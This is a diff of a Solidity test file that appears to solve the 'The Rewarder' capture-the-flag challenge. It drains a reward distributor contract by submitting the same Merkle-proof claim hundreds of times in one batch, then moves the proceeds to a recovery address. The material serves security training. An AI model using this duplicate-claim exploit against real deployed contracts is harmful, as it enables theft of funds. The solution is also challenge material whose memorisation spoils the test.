@@ -148,7 +148,50 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint wethAmount = 1171088749244340;
+        uint dvtAmount = 11524763827831882;
+        uint wethCycles = 853;
+        uint dvtCycles = 867;
+
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // claim weth 
+        IERC20[] memory tokensToClaim = new IERC20[](wethCycles);
+        Claim[] memory claims = new Claim[](wethCycles);
+        for (uint i; i < wethCycles; ++i) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first weth batch
+                amount: wethAmount,
+                tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // player address is at index 188
+            });
+            tokensToClaim[i] = IERC20(address(weth));
+            
+        }
+
+        // player claims dvt
+        IERC20[] memory tokensToClaimDVT = new IERC20[](dvtCycles);
+        Claim[] memory claimsDVT = new Claim[](dvtCycles);
+        for (uint i; i < dvtCycles; ++i) {
+            claimsDVT[i] = Claim({
+                batchNumber: 0, // claim corresponds to first dvt batch
+                amount: dvtAmount,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // player address is at index 188
+            });
+            tokensToClaimDVT[i] = IERC20(address(dvt));
+        }
+
+        console.log("palyer: %s", player);  
+        // call claimRewards on the distributor contract
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claimsDVT, inputTokens: tokensToClaimDVT});
+
+        // transfer all funds to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(address(player)));
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
